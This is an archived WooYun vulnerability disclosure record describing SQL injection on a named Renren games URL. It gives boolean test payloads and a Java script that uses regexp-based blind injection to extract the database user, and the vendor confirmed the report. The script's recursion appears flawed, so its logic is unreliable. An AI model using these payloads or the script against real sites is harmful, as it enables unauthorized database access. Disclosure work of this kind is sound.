{"id": 72814, "wybug_id": "wooyun-2015-0158645", "wybug_title": "人人网某站SQL注入（附注入脚本）", "wybug_corp": "人人网", "wybug_author": "路人甲", "wybug_date": "2015-12-06 09:51", "wybug_open_date": "2016-01-21 10:30", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向公众公开  简要描述： 奇葩。 详细说明：  好多大神挖，不知道会不会重复。\n注入点：http://ku.games.renren.com/?proid=14\n\nhttp://ku.games.renren.com/?proid=14 and 1=1  #响应数据http://ku.games.renren.com/?proid=14 and 1=2  #数据为空\n很简单的一个注入，但是用sqlmap无法跑起来，手动测试发现有 \",\" 的时候sql语句无法成功执行。问了大神，可以用regexp来规避 \",\"于是花了点时间写了一个脚本：（代码渣，轻喷。）\npublic class GetUser {\tstatic int no=0;\tpublic static void main(String[] args) {\t\ttest(null);\t}\tpublic static void test(String key){\t\tif(key==null){\t\t\tkey=\"\";\t\t}\t\tString url = \"http://ku.games.renren.com/?proid=14\";\t\tString[] payloads = { \"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\",\t\t\t\t\"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\",\t\t\t\t\"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\",\t\t\t\t\"8\", \"9\", \"@\", \"_\", \".\",\"~\"};\t\tif(no==0){\t\t\tno=WebUtils.getHtmlContextAll(url+URLEncoder.encode(\" AND 1=1\")).length();\t\t}\t\t\tfor (int j = 0; j < payloads.length; j++) {\t\t\t\tString testpayload=\" and (select+user()) regexp '^\"+key+payloads[j]+\"'\";\t\t\t\tString request=url+URLEncoder.encode(testpayload);\t\t\t\ttry {\t\t\t\t\tString html = WebUtils.getHtmlContextAll(request);\t\t\t\t    System.out.print(\"..\");\t\t\t\t\t if(html.length() >= no) {\t\t\t\t\t\t System.err.println(key+payloads[j]);\t\t\t\t\t\t test(payloads[j]);\t\t\t\t\t\t break;\t\t\t\t    }\t\t\t\t} catch (Exception e) {\t\t\t\t}\t\t\t}\t\t}}\n   漏洞证明：  \n\n   修复方案：  过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-12-07 10:22 厂商回复： 谢谢，非常感谢，我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}